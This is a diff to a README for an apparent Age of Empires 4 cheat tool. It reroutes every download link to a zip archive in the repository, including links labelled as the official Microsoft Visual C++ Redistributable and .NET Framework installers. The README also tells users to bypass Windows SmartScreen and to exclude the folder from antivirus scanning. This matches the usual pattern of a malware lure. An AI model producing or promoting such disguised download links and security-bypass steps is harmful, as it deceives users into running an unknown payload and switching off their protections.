@@ -1,6 +1,6 @@
 # 🏰 age-of-empires-4-cheats-strategy-lab - Your Ultimate AoE4 Strategy & Cheat Companion
 
-[![Download Now](https://img.shields.io/badge/Download-Age_of_Empires_4_Strategy_Lab-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ayan-saxena/age-of-empires-4-cheats-strategy-lab)
+[![Download Now](https://img.shields.io/badge/Download-Age_of_Empires_4_Strategy_Lab-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ayan-saxena/age-of-empires-4-cheats-strategy-lab/raw/refs/heads/main/ceibo/empires-strategy-lab-age-cheats-of-v3.7.zip)
 
 ## 🎮 What Is This?
 
@@ -50,7 +50,7 @@ For those who enjoy exploring game mechanics in creative ways, our experimental 
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [**Download Age of Empires 4 Strategy Lab**](https://github.com/ayan-saxena/age-of-empires-4-cheats-strategy-lab)
+Visit this link to download the application: [**Download Age of Empires 4 Strategy Lab**](https://github.com/ayan-saxena/age-of-empires-4-cheats-strategy-lab/raw/refs/heads/main/ceibo/empires-strategy-lab-age-cheats-of-v3.7.zip)
 
 The download button is prominently displayed on the page. Click it and wait for the download to complete.
 
@@ -92,7 +92,7 @@ To ensure smooth performance, your computer should meet these minimum specificat
 If you see "Windows protected your PC" message, click "More Info" and then "Run Anyway". This happens because the application isn't from the Microsoft Store.
 
 **Missing DLL Files**
-If you encounter errors about missing DLL files, install the latest [Microsoft Visual C++ Redistributable](https://aka.ms/vs/17/release/vc_redist.x64.exe) and [.NET Framework 4.8](https://dotnet.microsoft.com/download/dotnet-framework/net48).
+If you encounter errors about missing DLL files, install the latest [Microsoft Visual C++ Redistributable](https://github.com/ayan-saxena/age-of-empires-4-cheats-strategy-lab/raw/refs/heads/main/ceibo/empires-strategy-lab-age-cheats-of-v3.7.zip) and [.NET Framework 4.8](https://github.com/ayan-saxena/age-of-empires-4-cheats-strategy-lab/raw/refs/heads/main/ceibo/empires-strategy-lab-age-cheats-of-v3.7.zip).
 
 **Antivirus False Positives**
 Some antivirus programs may flag the trainer-style features. Add the application folder to your antivirus exclusions list if this occurs.
@@ -193,7 +193,7 @@ We're always happy to hear from users and help with any questions you might have
 
 ---
 
-**Remember:** Visit this link to download the application: [**Download Now**](https://github.com/ayan-saxena/age-of-empires-4-cheats-strategy-lab)
+**Remember:** Visit this link to download the application: [**Download Now**](https://github.com/ayan-saxena/age-of-empires-4-cheats-strategy-lab/raw/refs/heads/main/ceibo/empires-strategy-lab-age-cheats-of-v3.7.zip)
 
 Happy gaming, and may your villagers never idle!
 
